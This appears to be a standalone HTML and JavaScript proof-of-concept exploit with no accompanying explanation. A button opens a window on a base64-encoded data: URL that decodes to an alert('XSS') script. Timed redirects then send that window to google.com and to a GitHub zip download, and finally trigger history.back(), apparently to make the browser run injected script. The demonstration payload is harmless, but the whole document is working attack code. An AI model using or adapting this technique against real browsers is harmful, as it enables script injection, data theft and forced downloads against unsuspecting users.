<button onclick="test()">clickme</button>

<script>

function test()

{

  w = open('data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=')

  setTimeout(function(){

    w.location = 'https://google.com/'

  }, 300)

  setTimeout(function(){

      w.location = 'https://github.com/orwagodfather/virustotalx/archive/refs/heads/main.zip'

      setTimeout(function(){

        w.history.back()

      }, 2100)

  }, 2000)

}

</script>
